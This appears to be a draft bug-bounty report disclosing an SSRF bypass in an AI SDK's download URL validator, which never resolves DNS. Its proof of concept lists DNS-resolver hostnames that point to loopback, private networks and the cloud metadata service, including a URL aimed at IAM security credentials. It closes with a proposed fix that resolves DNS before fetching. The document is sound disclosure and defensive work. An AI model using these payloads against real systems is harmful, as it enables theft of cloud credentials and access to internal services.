# HackerOne Report: SSRF in AI SDK download() via DNS Resolver Domains

**NOTE**: Replace `[...]` placeholders below with actual values before submitting.

## Summary

The AI SDK's `validateDownloadUrl()` function blocks literal private IP addresses and known localhost hostnames, but **never resolves DNS**. Any domain that resolves to a private IP bypasses all protections and allows Server-Side Request Forgery (SSRF) when the SDK downloads user-provided file URLs.

## Affected Component

**Package**: `@ai-sdk/provider-utils`  
**File**: `packages/provider-utils/src/validate-download-url.ts`  
**Call chain**: `packages/ai/src/util/download/download.ts` → `validateDownloadUrl()` → `fetch()`  
**Version**: [...] (confirmed in latest `main` branch as of [...])  

## Vulnerability Type

CWE-918: Server-Side Request Forgery (SSRF)  
CWE-291: Reliance on IP-based filtering when DNS resolution is not performed

## Severity Assessment

**CVSS 3.1**: 8.6 (High)  
`AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N`

**Attack Vector**: Network — attacker provides a URL  
**Complexity**: Low — well-known DNS resolver services  
**Privileges**: None required  
**User Interaction**: None  
**Scope**: Changed — internal/cloud resources  
**Confidentiality**: High — access to cloud metadata, internal services  
**Integrity**: None  
**Availability**: None  

## Steps to Reproduce

### Proof of Concept

The following URLs ALL bypass `validateDownloadUrl()`:

```typescript
import { validateDownloadUrl } from '@ai-sdk/provider-utils';

// 8/8 bypass — all pass with no error thrown
validateDownloadUrl('http://localtest.me/');                            // → 127.0.0.1
validateDownloadUrl('http://lvh.me/');                                  // → 127.0.0.1
validateDownloadUrl('http://127.0.0.1.nip.io/');                        // → 127.0.0.1
validateDownloadUrl('http://169.254.169.254.nip.io/latest/meta-data/'); // → AWS metadata
validateDownloadUrl('http://10.0.0.1.nip.io/');                         // → 10.0.0.1
validateDownloadUrl('http://192.168.1.1.nip.io/');                      // → 192.168.1.1
validateDownloadUrl('http://127.0.0.1.sslip.io/');                      // → 127.0.0.1
validateDownloadUrl('http://169.254.169.254.sslip.io/');                // → cloud metadata
```

### Full Exploitation Flow

1. Application code (typical pattern):
```typescript
const result = await generateText({
  model: openai('gpt-4o'),
  messages: [{
    role: 'user',
    content: [
      { type: 'text', text: 'What is in this image?' },
      { type: 'file', data: { type: 'url', url: new URL(userInputUrl) } }
    ]
  }]
});
```

2. Attacker provides: `http://169.254.169.254.nip.io/latest/meta-data/iam/security-credentials/`

3. Internal flow:
   - `download.ts` calls `validateDownloadUrl("http://169.254.169.254.nip.io/...")`
   - Hostname `169.254.169.254.nip.io` is not a literal IP → `isIPv4()` returns false
   - Hostname doesn't equal `localhost` or end with `.local`/`.localhost` → passes
   - **URL is allowed** ✓
   - `fetch("http://169.254.169.254.nip.io/...")` → DNS resolves to `169.254.169.254`
   - **HTTP request hits cloud metadata service** ← SSRF!

## Impact

1. **Cloud Metadata Exfiltration**: Access `169.254.169.254` (AWS/GCP/Azure metadata) for IAM credentials and instance identity.
2. **Internal Network Scanning**: Access `10.x.x.x`, `192.168.x.x`, `172.16-31.x.x` for internal services.
3. **Local Service Access**: Access `127.0.0.1` for localhost services (Redis, debug endpoints).

## Root Cause

`validateDownloadUrl()` performs string-level checks on the hostname but never resolves DNS. Since `fetch()` resolves DNS internally, the domain `169.254.169.254.nip.io` → `169.254.169.254` completely bypasses string-level checks.

## Recommended Mitigation

Resolve DNS and validate resolved IPs before fetching:

```typescript
import * as dns from 'node:dns/promises';

export async function validateDownloadUrl(url: string): Promise<void> {
  // ... existing validation ...

  // NEW: Resolve hostname and check actual IPs
  if (!isIPv4(hostname) && !isIPv6(hostname)) {
    const addresses = await dns.resolve4(hostname);
    for (const address of addresses) {
      if (isPrivateIPv4(address)) {
        throw new DownloadError({ url, message: `URL resolves to private IP: ${address}` });
      }
    }
  }
}
```

This pattern already exists in the same codebase — see `packages/next/src/server/image-optimizer.ts` line 872 (`fetchExternalImage` function) which properly resolves DNS and checks IPs before making requests.

## References

- `packages/provider-utils/src/validate-download-url.ts` — vulnerable function
- `packages/ai/src/util/download/download.ts` — caller of the vulnerable function
- `packages/ai/src/prompt/convert-to-language-model-prompt.ts` — where user file URLs enter the pipeline
- `packages/next/src/server/image-optimizer.ts:872` — existing correct pattern (DNS resolution before fetch)
- `https://nip.io` — DNS resolver service documentation
- `https://sslip.io` — DNS resolver service documentation
